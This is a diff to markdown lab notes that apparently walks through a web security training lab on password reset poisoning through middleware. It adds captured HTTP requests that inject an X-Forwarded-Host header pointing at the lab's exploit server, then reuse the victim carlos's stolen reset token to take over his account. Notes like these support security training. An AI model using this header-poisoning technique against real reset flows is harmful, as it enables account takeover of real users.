@@ -595,10 +595,60 @@ carlos : daniel
   <summary>Lab: Password reset poisoning via middleware</summary>
 
 
-1. login with ``wiener:peter``
-2. signout
-3. login with ``carlos``
-4. click forget passowrd
+1. login with ``wiener`` with intercept the requests to burp
+2. click Forgot password
+3. check email you will found the forgot password link
+
+```url
+https://0a12002d04f669c8804203db001d00de.web-security-academy.net/forgot-password?temp-forgot-password-token=gdqz0wd8rbjy5naoxidh5gh986avyo73
+```
+  
+4. use it to change password
+5. now go to **``http history ``** in burp
+
+```http
+POST /forgot-password HTTP/2
+Host: 0a12002d04f669c8804203db001d00de.web-security-academy.net
+Cookie: session=Jeo1T3SAvjuL5M1hPBCX7juYaqJvr11U
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: https://0a12002d04f669c8804203db001d00de.web-security-academy.net
+Referer: https://0a12002d04f669c8804203db001d00de.web-security-academy.net/forgot-password
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+
+username=wiener
+```
+
+> ### change **``wiener``** to **``carlos``** and put **``X-Forwarded-Host``** header to your exploit server 
+
+```http
+X-Forwarded-Host: exploit-0a4500a80403694b801a029301f3005a.exploit-server.net
+
+username=carlos
+```
+
+see logs 
+
+<img width="1857" height="114" alt="image" src="https://github.com/user-attachments/assets/f55d2a68-86b7-4f93-9c76-27c9f02e3031" />
+
+```url
+/forgot-password?temp-forgot-password-token=z137ea4t8oymjlqytibtexwwy0srey8z
+```
+
+> ## now add new password to carlos and login 
+
+<img width="1375" height="668" alt="image" src="https://github.com/user-attachments/assets/04c8bafe-f425-44d3-bbc1-2da500842d18" />
 
   
 </details>
@@ -787,6 +837,14 @@ mfa-code=123456
 
 
 
+
+
+
+
+
+<details>
+  <summary></summary>
+</details>
 
 
 
